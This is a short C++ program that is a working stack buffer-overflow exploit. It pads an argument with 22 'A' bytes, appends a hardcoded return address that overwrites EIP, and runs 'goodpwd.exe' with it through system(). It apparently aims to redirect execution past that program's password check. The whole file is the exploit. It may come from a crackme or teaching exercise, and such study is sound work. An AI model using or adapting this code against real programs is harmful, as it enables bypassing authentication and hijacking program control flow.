#include <iostream>
#include <cstring>

int main(int argc, char *argv[])
{
  char command[256];
  char parameter[128];
  
 memset(parameter,0x41,22); // fill the parameter with 'A' character
  
  // now modify the location which overwrites the EIP
  
  parameter[22]= 0x48;
  parameter[23]= 0x15;
  parameter[24]= 0x40;
  parameter[25]= 0x00;

  parameter[26] = 0 ;  /* null terminate the parameter so as previous frames are not overwritten */
  
  strcpy(command , "goodpwd.exe ");
  strcat(command, parameter);
  
  printf("%s\n",command);
  
  system(command);	/* execute the command */
  return 0;
}
